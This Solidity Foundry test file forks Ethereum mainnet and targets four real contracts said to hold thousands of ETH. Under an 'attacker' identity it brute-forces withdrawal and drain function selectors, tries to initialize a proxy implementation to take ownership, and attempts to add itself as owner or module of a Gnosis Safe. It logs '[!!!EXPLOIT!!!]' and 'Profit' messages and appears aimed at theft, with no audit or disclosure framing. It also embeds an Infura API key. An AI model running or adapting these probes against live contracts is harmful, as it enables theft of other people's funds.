// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

/**
 * @title Deep Analysis of High-Value Targets
 * @notice Following up on scanner findings - investigating:
 * 1. 16,623 ETH contract at 0x6774Bcbd5ceCeF1336b5300fb5186a12DDD8b367
 * 2. 11,539 ETH contract at 0x5efc9D10E42FB517456f4ac41EB5e2eBe42C8918
 * 3. Proxy impl at 0xe03e12f83aBA2E6b955F96b5acf64082BB8AC162 (800+400 ETH behind it)
 * 4. 7,677 ETH contract at 0xC82Abe4dFA94b9B5453d31274Fb7500459a0d12d
 */

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
}

interface IOwnable {
    function owner() external view returns (address);
    function pendingOwner() external view returns (address);
    function transferOwnership(address) external;
    function acceptOwnership() external;
}

interface IInitializable {
    function initialize() external;
    function initialize(address) external;
    function initialize(address, address) external;
    function initialize(address, address, address) external;
    function initialize(bytes calldata) external;
}

contract DeepAnalysisTest is Test {
    bytes32 constant IMPL_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    bytes32 constant ADMIN_SLOT = 0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103;
    bytes32 constant OWNER_SLOT = bytes32(uint256(0)); // Common owner slot

    address attacker;
    string rpc = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";

    function setUp() public {
        vm.createSelectFork(rpc);
        attacker = makeAddr("attacker");
    }

    /*//////////////////////////////////////////////////////////////
                    TARGET 1: 16,623 ETH CONTRACT
    //////////////////////////////////////////////////////////////*/

    function testAnalyze16kETHContract() public {
        address target = 0x6774Bcbd5ceCeF1336b5300fb5186a12DDD8b367;

        console.log("=== ANALYZING 16,623 ETH CONTRACT ===");
        console.log("Target:", target);
        console.log("ETH Balance:", target.balance / 1e18, "ETH");
        console.log("Code size:", target.code.length);

        // Check storage slots for owner patterns
        bytes32 slot0 = vm.load(target, bytes32(uint256(0)));
        bytes32 slot1 = vm.load(target, bytes32(uint256(1)));
        bytes32 slot2 = vm.load(target, bytes32(uint256(2)));

        console.log("\n=== STORAGE SLOTS ===");
        console.log("Slot 0:", uint256(slot0));
        console.log("Slot 1:", uint256(slot1));
        console.log("Slot 2:", uint256(slot2));

        // Try to decode as addresses
        address addr0 = address(uint160(uint256(slot0)));
        address addr1 = address(uint160(uint256(slot1)));

        if (addr0 != address(0)) {
            console.log("Slot 0 as address:", addr0);
            console.log("  is contract:", addr0.code.length > 0);
        }
        if (addr1 != address(0)) {
            console.log("Slot 1 as address:", addr1);
            console.log("  is contract:", addr1.code.length > 0);
        }

        // Try common view functions
        _probeViewFunctions(target);

        // Try common privileged functions
        _probePrivilegedFunctions(target);
    }

    function testBruteForceWithdraw16kETH() public {
        address target = 0x6774Bcbd5ceCeF1336b5300fb5186a12DDD8b367;

        console.log("=== BRUTE FORCE WITHDRAW ATTEMPT ===");

        vm.startPrank(attacker);
        uint256 balBefore = attacker.balance;

        // Try ALL common withdrawal signatures
        bytes4[] memory sigs = new bytes4[](25);
        sigs[0] = bytes4(keccak256("withdraw()"));
        sigs[1] = bytes4(keccak256("withdraw(uint256)"));
        sigs[2] = bytes4(keccak256("withdrawAll()"));
        sigs[3] = bytes4(keccak256("withdrawETH()"));
        sigs[4] = bytes4(keccak256("withdrawETH(uint256)"));
        sigs[5] = bytes4(keccak256("claim()"));
        sigs[6] = bytes4(keccak256("claimAll()"));
        sigs[7] = bytes4(keccak256("claimRewards()"));
        sigs[8] = bytes4(keccak256("exit()"));
        sigs[9] = bytes4(keccak256("emergencyWithdraw()"));
        sigs[10] = bytes4(keccak256("rescue()"));
        sigs[11] = bytes4(keccak256("drain()"));
        sigs[12] = bytes4(keccak256("sweep()"));
        sigs[13] = bytes4(keccak256("collect()"));
        sigs[14] = bytes4(keccak256("redeem()"));
        sigs[15] = bytes4(keccak256("redeem(uint256)"));
        sigs[16] = bytes4(keccak256("getReward()"));
        sigs[17] = bytes4(keccak256("harvestRewards()"));
        sigs[18] = bytes4(keccak256("withdrawTo(address)"));
        sigs[19] = bytes4(keccak256("withdrawTo(address,uint256)"));
        sigs[20] = bytes4(keccak256("transfer(address,uint256)"));
        sigs[21] = bytes4(keccak256("sendETH(address,uint256)"));
        sigs[22] = bytes4(keccak256("execute()"));
        sigs[23] = bytes4(keccak256("call(address,uint256,bytes)"));
        sigs[24] = bytes4(keccak256("multicall(bytes[])"));

        for (uint i = 0; i < sigs.length; i++) {
            // Try without params
            (bool s1,) = target.call(abi.encodeWithSelector(sigs[i]));
            if (s1 && attacker.balance > balBefore) {
                console.log("[!!!EXPLOIT!!!] Function selector succeeded:", vm.toString(sigs[i]));
                console.log("Profit:", (attacker.balance - balBefore) / 1e18, "ETH");
                return;
            }

            // Try with attacker address
            (bool s2,) = target.call(abi.encodeWithSelector(sigs[i], attacker));
            if (s2 && attacker.balance > balBefore) {
                console.log("[!!!EXPLOIT!!!] Function with address succeeded:", vm.toString(sigs[i]));
                console.log("Profit:", (attacker.balance - balBefore) / 1e18, "ETH");
                return;
            }

            // Try with amount
            (bool s3,) = target.call(abi.encodeWithSelector(sigs[i], target.balance));
            if (s3 && attacker.balance > balBefore) {
                console.log("[!!!EXPLOIT!!!] Function with amount succeeded:", vm.toString(sigs[i]));
                console.log("Profit:", (attacker.balance - balBefore) / 1e18, "ETH");
                return;
            }
        }

        console.log("No simple withdrawal exploit found");
        vm.stopPrank();
    }

    /*//////////////////////////////////////////////////////////////
                    TARGET 2: PROXY IMPLEMENTATION ANALYSIS
    //////////////////////////////////////////////////////////////*/

    function testAnalyzeProxyImplementation() public {
        // Proxies at 0xdD276dc5223d... and 0x1B14376ee2d4... share implementation
        address impl = 0xe03e12f83aBA2E6b955F96b5acf64082BB8AC162;
        address proxy1 = 0xdD276dc5223d0120F9BF1776F38957CC8DA23Cb0; // 800 ETH
        address proxy2 = 0x1B14376ee2d46aE5c27A43D902d96D4F3F264B83; // 400 ETH

        console.log("=== PROXY IMPLEMENTATION ANALYSIS ===");
        console.log("Implementation:", impl);
        console.log("Proxy 1:", proxy1, "- ETH:", proxy1.balance / 1e18);
        console.log("Proxy 2:", proxy2, "- ETH:", proxy2.balance / 1e18);
        console.log("Total at risk:", (proxy1.balance + proxy2.balance) / 1e18, "ETH");

        // Check if implementation is initializable
        console.log("\n=== CHECKING IMPLEMENTATION INITIALIZATION ===");

        vm.startPrank(attacker);

        // Try various initialize signatures on IMPLEMENTATION directly
        bool initSuccess = false;

        (bool s1,) = impl.call(abi.encodeWithSignature("initialize()"));
        if (s1) {
            console.log("[CRITICAL] initialize() succeeded on implementation!");
            initSuccess = true;
        }

        (bool s2,) = impl.call(abi.encodeWithSignature("initialize(address)", attacker));
        if (s2) {
            console.log("[CRITICAL] initialize(address) succeeded on implementation!");
            initSuccess = true;
        }

        (bool s3,) = impl.call(abi.encodeWithSignature("initialize(address,address)", attacker, attacker));
        if (s3) {
            console.log("[CRITICAL] initialize(address,address) succeeded on implementation!");
            initSuccess = true;
        }

        // Check if attacker became owner of implementation
        if (initSuccess) {
            (bool ownerSuccess, bytes memory ownerData) = impl.staticcall(abi.encodeWithSignature("owner()"));
            if (ownerSuccess) {
                address owner = abi.decode(ownerData, (address));
                console.log("Implementation owner:", owner);
                if (owner == attacker) {
                    console.log("[!!!EXPLOIT!!!] Attacker is owner of implementation!");

                    // Now try to use this to attack proxies via selfdestruct
                    // Or find a way to drain via implementation
                }
            }
        }

        vm.stopPrank();

        // Analyze implementation storage
        console.log("\n=== IMPLEMENTATION STORAGE ===");
        for (uint i = 0; i < 5; i++) {
            bytes32 slot = vm.load(impl, bytes32(i));
            if (uint256(slot) != 0) {
                console.log("Impl slot", i, ":", uint256(slot));
            }
        }

        // Analyze proxy storage
        console.log("\n=== PROXY 1 STORAGE ===");
        for (uint i = 0; i < 5; i++) {
            bytes32 slot = vm.load(proxy1, bytes32(i));
            if (uint256(slot) != 0) {
                console.log("Proxy1 slot", i, ":", uint256(slot));
                address asAddr = address(uint160(uint256(slot)));
                if (asAddr.code.length > 0) {
                    console.log("  -> is contract:", asAddr);
                }
            }
        }
    }

    /*//////////////////////////////////////////////////////////////
                    TARGET 3: 11,539 ETH CONTRACT
    //////////////////////////////////////////////////////////////*/

    function testAnalyze11kETHContract() public {
        address target = 0x5efc9D10E42FB517456f4ac41EB5e2eBe42C8918;

        console.log("=== ANALYZING 11,539 ETH CONTRACT ===");
        console.log("Target:", target);
        console.log("ETH Balance:", target.balance / 1e18, "ETH");
        console.log("Code size:", target.code.length);

        // Read storage
        console.log("\n=== STORAGE ANALYSIS ===");
        for (uint i = 0; i < 10; i++) {
            bytes32 slot = vm.load(target, bytes32(i));
            if (uint256(slot) != 0) {
                console.log("Slot", i, ":", uint256(slot));

                // Try to interpret as address
                address asAddr = address(uint160(uint256(slot)));
                if (asAddr != address(0) && asAddr.code.length > 0) {
                    console.log("  -> contract at:", asAddr);
                }
            }
        }

        // Probe functions
        _probeViewFunctions(target);
        _probePrivilegedFunctions(target);
    }

    /*//////////////////////////////////////////////////////////////
                    TARGET 4: 7,677 ETH CONTRACT
    //////////////////////////////////////////////////////////////*/

    function testAnalyze7kETHContract() public {
        address target = 0xC82Abe4dFA94b9B5453d31274Fb7500459a0d12d;

        console.log("=== ANALYZING 7,677 ETH CONTRACT ===");
        console.log("Target:", target);
        console.log("ETH Balance:", target.balance / 1e18, "ETH");
        console.log("Code size:", target.code.length);

        // Check if it's a Safe (Gnosis)
        (bool isSafe, bytes memory data) = target.staticcall(abi.encodeWithSignature("VERSION()"));
        if (isSafe) {
            console.log("This might be a Gnosis Safe!");
            console.log("Version:", string(data));
        }

        // Check owners
        (bool hasOwners, bytes memory ownersData) = target.staticcall(abi.encodeWithSignature("getOwners()"));
        if (hasOwners) {
            address[] memory owners = abi.decode(ownersData, (address[]));
            console.log("Safe owners count:", owners.length);
            for (uint i = 0; i < owners.length && i < 5; i++) {
                console.log("  Owner", i, ":", owners[i]);
            }
        }

        // Check threshold
        (bool hasThreshold, bytes memory thresholdData) = target.staticcall(abi.encodeWithSignature("getThreshold()"));
        if (hasThreshold) {
            uint256 threshold = abi.decode(thresholdData, (uint256));
            console.log("Threshold:", threshold);
        }

        // Try to find vulnerabilities in safe setup
        console.log("\n=== CHECKING SAFE VULNERABILITIES ===");

        vm.startPrank(attacker);

        // Try to become module
        (bool s1,) = target.call(abi.encodeWithSignature("enableModule(address)", attacker));
        if (s1) {
            console.log("[CRITICAL] enableModule succeeded!");
        }

        // Try to add owner
        (bool s2,) = target.call(abi.encodeWithSignature("addOwnerWithThreshold(address,uint256)", attacker, 1));
        if (s2) {
            console.log("[CRITICAL] addOwnerWithThreshold succeeded!");
        }

        // Try to change threshold
        (bool s3,) = target.call(abi.encodeWithSignature("changeThreshold(uint256)", 1));
        if (s3) {
            console.log("[CRITICAL] changeThreshold succeeded!");
        }

        vm.stopPrank();
    }

    /*//////////////////////////////////////////////////////////////
                    HELPER FUNCTIONS
    //////////////////////////////////////////////////////////////*/

    function _probeViewFunctions(address target) internal view {
        console.log("\n=== PROBING VIEW FUNCTIONS ===");

        // Owner patterns
        (bool s1, bytes memory d1) = target.staticcall(abi.encodeWithSignature("owner()"));
        if (s1 && d1.length >= 32) {
            console.log("owner():", abi.decode(d1, (address)));
        }

        (bool s2, bytes memory d2) = target.staticcall(abi.encodeWithSignature("admin()"));
        if (s2 && d2.length >= 32) {
            console.log("admin():", abi.decode(d2, (address)));
        }

        (bool s3, bytes memory d3) = target.staticcall(abi.encodeWithSignature("pendingOwner()"));
        if (s3 && d3.length >= 32) {
            address pending = abi.decode(d3, (address));
            if (pending != address(0)) {
                console.log("[!] pendingOwner():", pending);
            }
        }

        // Token info
        (bool s4, bytes memory d4) = target.staticcall(abi.encodeWithSignature("name()"));
        if (s4 && d4.length > 0) {
            try this.decodeName(d4) returns (string memory name) {
                console.log("name():", name);
            } catch {}
        }

        (bool s5, bytes memory d5) = target.staticcall(abi.encodeWithSignature("symbol()"));
        if (s5 && d5.length > 0) {
            try this.decodeName(d5) returns (string memory symbol) {
                console.log("symbol():", symbol);
            } catch {}
        }

        // Supply/balance
        (bool s6, bytes memory d6) = target.staticcall(abi.encodeWithSignature("totalSupply()"));
        if (s6 && d6.length >= 32) {
            console.log("totalSupply():", abi.decode(d6, (uint256)));
        }
    }

    function _probePrivilegedFunctions(address target) internal {
        console.log("\n=== PROBING PRIVILEGED FUNCTIONS ===");

        vm.startPrank(attacker);
        uint256 ethBefore = attacker.balance;

        // Transfer ownership
        (bool s1,) = target.call(abi.encodeWithSignature("transferOwnership(address)", attacker));
        if (s1) console.log("[!!!] transferOwnership succeeded!");

        // Accept ownership (2-step)
        (bool s2,) = target.call(abi.encodeWithSignature("acceptOwnership()"));
        if (s2) console.log("[!!!] acceptOwnership succeeded!");

        // Set admin
        (bool s3,) = target.call(abi.encodeWithSignature("setAdmin(address)", attacker));
        if (s3) console.log("[!!!] setAdmin succeeded!");

        // Withdraw patterns
        (bool s4,) = target.call(abi.encodeWithSignature("withdraw()"));
        if (s4 && attacker.balance > ethBefore) {
            console.log("[EXPLOIT] withdraw() gave ETH!");
        }

        (bool s5,) = target.call(abi.encodeWithSignature("emergencyWithdraw()"));
        if (s5 && attacker.balance > ethBefore) {
            console.log("[EXPLOIT] emergencyWithdraw() gave ETH!");
        }

        // Sweep
        (bool s6,) = target.call(abi.encodeWithSignature("sweep(address)", address(0)));
        if (s6) console.log("[!!!] sweep succeeded!");

        // Pause
        (bool s7,) = target.call(abi.encodeWithSignature("pause()"));
        if (s7) console.log("[HIGH] pause() succeeded!");

        // Initialize
        (bool s8,) = target.call(abi.encodeWithSignature("initialize()"));
        if (s8) console.log("[CRITICAL] initialize() succeeded!");

        (bool s9,) = target.call(abi.encodeWithSignature("initialize(address)", attacker));
        if (s9) console.log("[CRITICAL] initialize(address) succeeded!");

        vm.stopPrank();
    }

    function decodeName(bytes memory data) external pure returns (string memory) {
        return abi.decode(data, (string));
    }

    receive() external payable {}
}
